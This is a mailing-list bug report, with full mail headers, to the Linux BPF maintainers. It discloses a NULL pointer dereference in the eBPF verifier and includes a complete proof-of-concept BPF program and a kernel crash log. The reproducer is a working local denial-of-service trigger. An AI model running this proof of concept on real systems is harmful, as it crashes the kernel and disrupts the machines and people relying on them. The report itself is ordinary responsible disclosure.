Received: from mail-oa1-f46.google.com (mail-oa1-f46.google.com [209.85.160.46])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 88A111E9B3A
	for <bpf@vger.kernel.org>; Thu, 16 Apr 2026 02:17:00 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.160.46
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776305821; cv=pass; b=lKjyrLERJFMovDd3nC+DZzX85S2AjeizIYzFpITEhEYk8iihE47a8klv65OJStEi0AuIXhSruDMnVn8aYUKtGAEhDVJV+ucjIrPsZuBbSWvCdecVsNXND11Sb5kV9JGQPbja4wLqkmo6I9jHYgb1rPBf3qABUP8pucR+q+pWqtg=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776305821; c=relaxed/simple;
	bh=wQiqqhufJb3tgxCD7PXkpOY37pzGWg0bq19XBLHfrVQ=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=FOwVNzmULJg24nrSobYf05ojwGPDz1m1535vKOZUoFCAFvk/6ehJlVM7QCBCjjOoEXkgSvTM3Jj4yO3DBcIcKoBDeHOoLLILOPaXXqFnb+san8xyZk8aevvczk2zek6ppITGzvCDLNOhwjvHQXMNVhslcV90CQz2GHxzDx4LGUM=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=CNjV2Sdn; arc=pass smtp.client-ip=209.85.160.46
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="CNjV2Sdn"
Received: by mail-oa1-f46.google.com with SMTP id 586e51a60fabf-408778a8ec4so4498837fac.0
        for <bpf@vger.kernel.org>; Wed, 15 Apr 2026 19:17:00 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1776305819; cv=none;
        d=google.com; s=arc-20240605;
        b=i1LPRKFbCwQ5CnZ/YpSwvqAEKr1hHlauNq9cIiTkHfidI/wT4b6dNnuH11DNiWtGc4
         wPowPmKefdGsMsX11Ld5ZX+gn+3wIsX3ragVKH+/VhyU287oxKdw8wbVwD3kpZwo8OOD
         HS/91bxvIlgMpS6t5k2PtCD559/J5CLUWVeoxGeuvfPSzQg6OzJ+zHeOwQxkCw/nGtDw
         wyRKbwP5HurB2k8vpDaKNn0lsvYc/HALULYmhoxOD9mBcgLUmk2RIHpR5ZIQjAoYUJaF
         bV2NRAY+cBbmqgiSxqoewWe4dvgWZqPKw68Da2wClCaYHifb/bBxQ3Ah7EEnAgRybtdt
         ad7Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:dkim-signature;
        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
        fh=TTVlj2kuBmRlDnx3M34FyqSZGRYkgzIKUZTj43GqLgU=;
        b=BV+x/VIFtqhXLUlQb8txWidrg4e6H9JCK88lS5EEbd3u15lUtkk0WF0Iqm81bNwuOP
         uvtGYUk0P9L1SGSv/Ql0GXeNGAMSTaGiJkLDZW787SV34l179QjAebDa6PHXH/KqQKAA
         iPe9ZpvEcr9QaIspn8Oky2ahGg955OuvAlqefNDKcUhvhwS7mEcxz8NB43Hl2Frveblq
         hzgf+mpY76zAauPaoZvmWybeCVFDA6uEi+MTCF0dLFTonqBWBocMMC6NS3XsOWOAU8RR
         8E1fJzdlIFKV4VMLf//6wc14iej3WpioNwmwtX+oLQ1Lqnhpaq9q6kKWk/HvCg84fBSl
         bWug==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1776305819; x=1776910619; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:from:to:cc:subject:date:message-id:reply-to;
        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
        b=CNjV2SdnWRicGal81q+BFRSAh+lYHteGGGT48BvzsJlt4srFyI5BhWr98TCeWYs/0r
         bBOgKbJtbiUjcY/g0j7c71IFFEhKcKV7ag2QsYn+aCHFXzryMu7w73OgBb8Vux6DTLI8
         e4XvCUPN8DLTXqqZgC93nYTRUg0ncScstoRi/C+fT39WrVo0au/3dc4FGQGGV2dutdjd
         nfhqZ33jQmLT33eU+KMc+4fgB6s5VvAnHN+X0tj2AflM/8rmT91ZOMgKAScf0x5xBjO3
         w4X4q4TRz/mVpKG5HRsAQt2Fm1GH1Gvz0MRUzeucMuNiqfFlHQyhd/Zye657yCZAH/oJ
         AWpg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1776305819; x=1776910619;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=9vkatUbRivgvsdjHxZsjduzTdH/QUeQrYtw+cmD2zlY=;
        b=IzEADkSdoLG1pol5WsZvZzIIFK+eydj81rGZCwt+Yyk8CMAy6WeJ32YhBj7XPBeG5I
         WQk5caLIJ0i6d+zPkRgFDzMeDS+RAll6k0xjU04SRqP0Lygf8+L0TV6xnfO2e+i9WjC+
         mj3wJeDThmm+zDCjZ/eMB/pZbSOhaxqAnhHeO+rb3mwU/nVCO8yNDgj30SoydQF9CK6S
         jRr851/MTA2XUhxNNnb2eRNR1BNt+2EKoyisqc9lnyz5baCea2SuBIDuM4YPqiIEPuSk
         cuP9J+weg2h/O6FHNc7Eqofok+qcC2c+igCC10yC/6YKxqf58jD+p+nfRQ5cm9pV5cND
         j11g==
X-Gm-Message-State: AOJu0Yz6F8mKrJzebVDDljRGURANXy982+0eg7KMxxPLVj5AgM/mDVTw
	dQdQQtg0jWurws8YHLV6AGrHwxf7cB6o46cO8wTBCndde7V64G+sL3PrPtBOaNSRN8dI4MIeCpZ
	h9n/nS5sNvUhvlGKe+MCJkjgMZtGBELtUoCuI7GxkU0nRZAE=
X-Gm-Gg: AeBDiesXnigFCajZDPRNiAVFdcVDt1IbGmGkIJSXGhM+hDgb2jVbkZi00N8QDoUIrPy
	hl0BnnmetDysRHft8HK4nFWA/riUDZT8JYUvAbgZbuiAp1OY94lTtuit6Ke4Fj/5Ss5rZwiqJyS
	+iIkIkahRsO//SBNcCiqOE//yB5EoI63BQjqaNpgDjLPEhthd8tOegIuvYk1AnfMoI+Rp26O8+N
	CXyKw6G5tikXKaxIiOOYkiv/rxVOqJlqFoGcvq5uJRcbO0ZVTY6ec9XJm+0JURI8uuJyPJeHAi7
	7HAwyg==
X-Received: by 2002:a05:6870:420f:b0:417:5105:a735 with SMTP id
 586e51a60fabf-423e11118ecmr13498590fac.33.1776305819281; Wed, 15 Apr 2026
 19:16:59 -0700 (PDT)
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Hiker Cl <clhiker365@gmail.com>
Date: Thu, 16 Apr 2026 10:16:46 +0800
X-Gm-Features: AQROBzBYX4zd6BdxBIcwUa7EyBGQ0SzGZ4lXbLy4c9ax8OzRHuVydFZsHlg57oI
Message-ID: <CAGM=xGABGeeGVU7hy_mRr_rp377dBzVVAOpkLnuYKb8XyEs7Hg@mail.gmail.com>
Subject: NULL pointer dereference in map_kptr_match_type when storing scalar
 values into kptr slots
To: bpf@vger.kernel.org
Cc: linux-kernel@vger.kernel.org, netdev@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi BPF maintainers,

I'm reporting a bug I encountered in the BPF subsystem on Linux kernel
version 7.0.0-g1f5ffc672165.

### Summary
A NULL pointer dereference vulnerability was discovered in the eBPF
verifier. A local user can trigger this by loading a BPF program that
attempts to store a scalar value (non-pointer) into a map slot
designated as a kptr (kernel pointer). This leads to an immediate
kernel crash (DoS).
### Environment
- Kernel version: 7.0.0-rc6 (Commit: 71b500afd2f7 from bpf-next tree),
7.0.0-g1f5ffc672165 (Commit: 1f5ffc672165 from linux tree)
- Architecture: x86_64
- Config: BPF_SYSCALL=3Dy, DEBUG_INFO_BTF=3Dy

### Steps to Reproduce =EF=BC=88poc.c)
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
/* BTF type tags for kptrs */
#ifndef __kptr_untrusted
#define __kptr_untrusted __attribute__((btf_type_tag("kptr_untrusted")))
#endif
struct map_value {
struct task_struct __kptr_untrusted *ptr;
};
struct {
__uint(type, BPF_MAP_TYPE_LRU_HASH);
__uint(max_entries, 1);
__type(key, int);
__type(value, struct map_value);
} crashing_map SEC(".maps");
SEC("kprobe/htab_map_get_next_key")
int trigger_crash(struct pt_regs *ctx)
{
int key =3D 0;
u64 *val =3D bpf_map_lookup_elem(&crashing_map, &key);
if (val) {
/*
* Trigger: Store a scalar (non-pointer) into a slot
* designated as a kptr. The verifier's map_kptr_match_type
* fails to handle the NULL reg->btf for scalars.
*/
*val =3D 0xdeadbeef;
}
return 0;
}
char LICENSE[] SEC("license") =3D "GPL";

### Kernel Log Extract
[   91.277247][ T7627] Oops: general protection fault, probably for
non-canonical address 0xdffffc0000I
[   91.279715][ T7627] KASAN: null-ptr-deref in range
[0x00000000000000e8-0x00000000000000ef]
[   91.280906][ T7627] CPU: 0 UID: 0 PID: 7627 Comm: bpftool Not
tainted 7.0.0-g1f5ffc672165 #5 PREEMPT(full)
[   91.282421][ T7627] Hardware name: QEMU Standard PC (i440FX + PIIX,
1996), BIOS 1.15.0-1 04/01/2014
[   91.283556][ T7627] RIP: 0010:btf_is_kernel+0x2a/0x50
...

### Actual Results
The kernel crashes during the verification phase. The verifier calls
`map_kptr_match_type`, which subsequently calls
`btf_is_kernel(reg->btf)`. Since the source register is a scalar,
`reg->btf` is NULL, leading to a NULL pointer dereference.

Detailed info including reproducible BPF program and kernel logs have
been filed on Bugzilla:

  https://bugzilla.kernel.org/show_bug.cgi?id=3D221372

Please let me know if you need more information or if I can help test a pat=
ch.
